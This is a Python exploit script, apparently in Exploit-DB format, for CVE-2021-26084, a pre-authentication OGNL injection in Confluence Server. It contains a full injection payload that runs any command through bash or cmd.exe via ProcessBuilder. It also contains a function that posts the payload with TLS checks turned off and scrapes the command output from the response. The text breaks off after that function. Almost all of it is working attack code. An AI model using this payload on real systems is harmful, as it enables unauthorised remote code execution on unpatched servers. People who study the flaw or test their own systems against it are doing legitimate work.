#!/usr/bin/python3

# Exploit Title: Confluence Server Webwork OGNL injection (PreAuth-RCE)
# Google Dork: N/A
# Date: 09/01/2021
# Vendor Homepage: https://www.atlassian.com/
# Software Link: https://www.atlassian.com/software/confluence/download-archives
# Version: All < 7.12.x versions before 7.12.5
# Tested on: Linux Distros 
# CVE : CVE-2021-26084

# References: 
# https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html
# https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md

import requests
import optparse
from bs4 import BeautifulSoup
import optparse 
from requests.packages import urllib3
urllib3.disable_warnings()


session = requests.Session()




def cmdExec(xpl_url, mode,cmd):


    
    xpl_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip, deflate"}
    
    xpl_data = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+cmd+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
    
    rawHTML = session.post(xpl_url, headers=xpl_headers, data=xpl_data, verify=False, timeout=5)

    soup = BeautifulSoup(rawHTML.text, 'html.parser')
    
    queryStringValue = soup.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
    if mode == "shell": 
        return True
    if mode == "attack" and "uid=" in queryStringValue and "gid=" in queryStringValue: 
        return queryStringValue.split(" ")[0]
    else: 
        return False

